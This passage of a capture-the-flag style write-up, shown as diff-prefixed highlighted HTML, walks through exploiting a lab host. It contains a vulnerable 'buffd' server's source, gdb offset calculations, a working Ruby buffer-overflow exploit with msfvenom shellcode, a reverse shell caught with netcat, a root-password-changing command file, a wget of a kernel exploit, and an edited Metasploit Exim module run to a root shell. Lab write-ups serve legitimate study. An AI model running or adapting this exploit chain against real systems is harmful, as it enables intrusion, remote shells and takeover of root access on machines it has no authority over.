-</span><span class='line'><span class="n">new_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">new_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">inet_ntop</span><span class="p">(</span><span class="n">their_addr</span><span class="p">.</span><span class="n">ss_family</span><span class="p">,</span>
-</span><span class='line'><span class="n">get_in_addr</span><span class="p">((</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">),</span>
-</span><span class='line'><span class="n">s</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">s</span><span class="p">);</span>
-</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: got connection from %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// this is the child process</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> <span class="c1">// child doesn&#39;t need the listener</span>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;HELO</span><span class="se">\n</span><span class="s">COMMAND:&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;send&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="n">vulnerable</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;RECV: &quot;</span><span class="p">);</span>
-</span><span class='line'><span class="n">strcat</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span> <span class="c1">// parent doesn&#39;t need this</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
-patterns we calculate the offset for EIP. To make an exploit reliable, we are
-looking also for some registers, pointing to our pattern in memory.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/repo# gdb ./buffd  -q
-</span><span class='line'>Reading symbols from /root/repo/buffd...done.
-</span><span class='line'>(gdb) set follow-fork-mode child
-</span><span class='line'>(gdb) run
-</span><span class='line'>Starting program: /root/repo/buffd
-</span><span class='line'>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
-</span><span class='line'>server: waiting for connections...
-</span><span class='line'>server: got connection from 127.0.0.1
-</span><span class='line'>[New process 4201]
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 4201]
-</span><span class='line'>0x65413165 in ?? ()
-</span><span class='line'>(gdb) i r
-</span><span class='line'>eax            0xbfffe790       -1073748080
-</span><span class='line'>ecx            0x0      0
-</span><span class='line'>edx            0xca     202
-</span><span class='line'>ebx            0xb7fbeff4       -1208225804
-</span><span class='line'>esp            0xbfffe810       0xbfffe810
-</span><span class='line'>ebp            0x41306541       0x41306541
-</span><span class='line'>esi            0x0      0
-</span><span class='line'>edi            0x0      0
-</span><span class='line'>eip            0x65413165       0x65413165
-</span><span class='line'>eflags         0x10246  [ PF ZF IF RF ]
-</span><span class='line'>cs             0x73     115
-</span><span class='line'>ss             0x7b     123
-</span><span class='line'>ds             0x7b     123
-</span><span class='line'>es             0x7b     123
-</span><span class='line'>fs             0x0      0
-</span><span class='line'>gs             0x33     51
-</span><span class='line'>(gdb) x /5x $eax
-</span><span class='line'>0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
-</span><span class='line'>0xbfffe7a0:     0x61413561
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# nc 127.0.0.1 7777
-</span><span class='line'>HELO
-</span><span class='line'>COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-</span><span class='line'>^C
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
-</span><span class='line'>[*] Exact match at offset 124
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
-</span><span class='line'>[*] Exact match at offset 0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>EIP begins on offset 124 and the register EAX points to the beginning of our
-buffer, right now filled with pattern. Luckily, we find call eax opcodes in
-binary too.</p>
-
-<p>The strange thing is that the stack in binary is marked as non-executable,
-but on this server the exploit works and we don&rsquo;t get segfault:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
-</span><span class='line'>Elf file type is EXEC (Executable file)
-</span><span class='line'>Entry point 0x80488e0
-</span><span class='line'>There are 7 program headers, starting at offset 52
-</span><span class='line'>
-</span><span class='line'>Program Headers:
-</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
-</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
-</span><span class='line'>  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
-</span><span class='line'>      [Requesting program interpreter: /lib/ld-linux.so.2]
-</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
-</span><span class='line'>  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
-</span><span class='line'>  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
-</span><span class='line'>  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
-</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Exploit in Ruby:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># cat exploit.rb</span>
-</span><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd</span>
-</span><span class='line'><span class="c1">#[repo/buffd]</span>
-</span><span class='line'><span class="c1">#0x0804898f call eax</span>
-</span><span class='line'><span class="c1">#0x08048efb call eax</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b &#39;\x00\xff&#39; CMD=&quot;/tmp/commands&quot; -f ruby</span>
-</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb8\x8e\x24\x01\x8b\xb1</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">124</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
-</span><span class='line'><span class="n">exploit</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804898f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
-</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.143&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">7777</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Exploit runs arbitrary command that we put on vulnerable server to /tmp/commands.</p>
-
-<p>We connect to the host:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# nc -lvp 1337
-</span><span class='line'>listening on [any] 1337 ...
-</span><span class='line'>192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
-</span><span class='line'>connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
-</span><span class='line'>sh: no job control in this shell
-</span><span class='line'>sh-2.05b$ cd /tmp</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To obtain root privileges, we can run ssh server and put to &lsquo;/tmp/commands&rsquo;
-file the instructions to change root password:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>debian:/tmp# chmod +x commands
-</span><span class='line'>debian:/tmp# cat commands
-</span><span class='line'>echo -e "1234\n1234\n" | passwd</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In Metasploit is there is another module which we can use to exploit Exim4
-(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
-to comment the following lines and also change exim to exim4:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="mi">114</span>     <span class="c1">#if not datastore[&#39;SkipVersionCheck&#39;] and self.banner !~ /Exim 4\.6\d+/i</span>
-</span><span class='line'><span class="mi">115</span>     <span class="c1">#  fail_with(Failure::Unknown, &quot;Warning: This version of Exim is not exploitable&quot;)</span>
-</span><span class='line'><span class="mi">116</span>     <span class="c1">#end</span>
-</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span>
-</span><span class='line'><span class="mi">341</span>       <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C</span><span class="si">#{</span><span class="n">temp_conf</span><span class="si">}</span><span class="s2"> -q</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(exim4_string_format) > rexploit
-</span><span class='line'>[*] Reloading module...
-</span><span class='line'>
-</span><span class='line'>[*] Started reverse double handler
-</span><span class='line'>[*] Connecting to 192.168.80.143:25 ...
-</span><span class='line'>[*] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
-</span><span class='line'>[*] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
-</span><span class='line'>[*] EHLO: 250-SIZE 52428800
-</span><span class='line'>[*] EHLO: 250-PIPELINING
-</span><span class='line'>[*] EHLO: 250 HELP
-</span><span class='line'>[*] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
-</span><span class='line'>[*] MAIL: 250 OK
-</span><span class='line'>[*] RCPT: 250 Accepted
-</span><span class='line'>[*] DATA: 354 Enter message, ending with "." on a line by itself
-</span><span class='line'>[*] Constructing initial headers ...
-</span><span class='line'>[*] Constructing HeaderX ...
-</span><span class='line'>[*] Constructing body ...
-</span><span class='line'>[*] Sending 50 megabytes of data...
-</span><span class='line'>[*] Ending first message.
-</span><span class='line'>[*] Result: "552 Message size exceeds maximum permitted\r\n"
-</span><span class='line'>[*] Sending second message ...
-</span><span class='line'>[*] MAIL result: "250 OK\r\n"
-</span><span class='line'>[*] RCPT result: "sh-2.05b$ "
-</span><span class='line'>[*] Looking for Perl to facilitate escalation...
-</span><span class='line'>[*] Perl binary detected, attempt to escalate...
-</span><span class='line'>[*] Using Perl interpreter at /usr/bin/perl...
-</span><span class='line'>[*] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv...
-</span><span class='line'>[*] Attempting to execute payload as root...
-</span><span class='line'>[*] Accepted the first client connection...
-</span><span class='line'>[*] Accepted the second client connection...
-</span><span class='line'>[*] Command: echo QDibz6UzrEBUyJQT;
-</span><span class='line'>[*] Writing to socket A
-</span><span class='line'>[*] Writing to socket B
-</span><span class='line'>[*] Reading from sockets...
-</span><span class='line'>[*] Reading from socket B
-</span><span class='line'>[*] B: "QDibz6UzrEBUyJQT\r\n"
-</span><span class='line'>[*] Matching...
-</span><span class='line'>[*] A is input...
-</span><span class='line'>[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200
-</span><span class='line'>
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=0(root)</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
